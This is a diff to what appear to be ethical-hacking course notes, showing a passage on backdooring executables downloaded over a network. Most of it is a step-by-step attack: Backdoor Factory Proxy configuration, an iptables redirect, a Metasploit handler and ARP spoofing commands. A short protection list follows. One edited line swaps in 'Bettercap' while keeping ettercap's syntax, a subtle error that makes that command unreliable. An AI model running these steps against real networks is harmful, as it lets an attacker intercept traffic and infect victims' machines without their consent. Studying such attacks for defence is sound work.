@@ -836,12 +836,12 @@ $ msfconsole
 - Backdoor any exe the target downloads.
 - We need to be in the middle of the connection.
 - Tool : Backdoor Factory Proxy (find installation steps in repository folder : backdoor-factory-proxy)
-> steps:  
+- steps:  
   1. edit bdfproxy config -> leafpad /opt/bdfproxy/bdfproxy.cfg
     - Set IP address to your IP in config.
       - look for [[[WindowsIntelx86]]]  and [[[WindowsIntelx64]]]  --> your target Machine
       - HOST = YOUR_IP_ADDRESS
-    - Change Proxy mode : proxyMode = transparent
+      - Change Proxy mode : proxyMode = transparent
   2. Start bdfproxy. > bdfproxy.py    (program as soon as receive a request it backdoors that program)
   3. Redirect traffic to bdfproxy.  
     - iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
@@ -849,7 +849,7 @@ $ msfconsole
     - msfconsole -r /opt/bdfproxy/bdfproxy_msf_resource.rc
     - or it may be at path : /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
   5. Start arp spoofing.  
-    - ettercap -Tq -M arp:remote -i [interface] /[Gatewaay IP]// /Target IP/
+    - Bettercap -Tq -M arp:remote -i [interface] /[Gatewaay IP]// /Target IP/
   6. When done reset ip tables rules. > ./flushiptables.sh
 
 ## Protection against : Client Side Attacks
@@ -857,3 +857,5 @@ $ msfconsole
 - Only download from https pages
 - check file MD5 after download:
   - http://www.winmd5.com/
+
+## Gaining access : Client Side Attacks - Social Engineering
